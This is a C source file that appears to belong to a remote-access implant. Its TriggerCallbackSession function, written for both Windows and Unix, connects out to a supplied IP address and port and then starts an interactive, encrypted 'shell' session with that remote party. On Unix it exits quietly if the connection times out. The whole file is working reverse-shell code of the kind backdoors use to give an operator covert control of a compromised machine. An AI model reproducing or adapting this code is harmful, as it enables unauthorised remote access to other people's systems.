#include "trigger_callback_session.h"
#include "client_session.h"
#include "debug.h"
#include "polarssl/net.h"

#ifndef WIN32
#include <signal.h>
#include <unistd.h>
#endif
//******************************************************************************
static void connect_alarm( int signo )
{
	(void) signo;
	exit( 0 );
	return;
}


#if defined WIN32
int TriggerCallbackSession( char* ip, int port )
{
	int sock;
	int retval = 0;
	struct sockaddr_in client;

	//Get a Socket
	if( ( sock = socket(AF_INET,SOCK_STREAM,IPPROTO_IP) ) == SOCKET_ERROR )
	{
		// socket() failed
		D( perror( "socket()" ); )
			return FAILURE;
	}

	//setup the connect struct
	memset(&client, 0, sizeof(struct sockaddr_in));
	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(ip);
	client.sin_port = htons(port);

	//Connect to the CLIENT
	if(SOCKET_ERROR == connect(sock,(struct sockaddr *)&client,sizeof(struct sockaddr_in)))
	{
		D( perror( "connect()" ); )
			closesocket(sock);
		return FAILURE;
	}

	//This will start the active connect shell with the client
	//at this point, we have an established TCP/IP connection
	retval = StartClientSession(sock);

	//	D( printf( " DEBUG %s:%i\n", __FILE__, __LINE__ ); )
	closesocket(sock);

	//	D( printf( " DEBUG %s:%i\n", __FILE__, __LINE__ ); )
	return retval;
}
#else
//******************************************************************************
int TriggerCallbackSession( char *ip, int port )
{
	int sock;
	int retval = 0;

	// set alarm for connect
	signal( SIGALRM, connect_alarm );
	if ( alarm( CONNECT_TIMEOUT ) != 0 )
	{
		D( printf( "%s:%i: ERROR: alarm() already set\n", __FILE__, __LINE__ ); );
	}

	// connect to client
	if ( net_connect( &sock, ip, port ) < 0 )
	{
		D( printf( "%s:%i: net_connect() failed\n", __FILE__, __LINE__ ); );
		retval = -1;
		goto cleanup;
	}

	// connect was successful so disable alarm
	alarm( 0 );

	//alarm( SESSION_TIMEOUT );
	// We have an established TCP/IP connection.
	// This will initialize crypto and start the interactive 'shell' with the client.
	// StartClientSession() will not return until that session closes.
	D( printf( "%s:%i: Starting client session...\n", __FILE__, __LINE__ ); );
	retval = StartClientSession( sock );
		
	//alarm( 0 );
	// if StartClientSession() returns SHUTDOWN, that case is handled
	// in the caller, the start_triggered_connect() thread

cleanup:
#if 0
	closesocket(sock);
#endif
	net_close( sock );

	return retval;
}
#endif
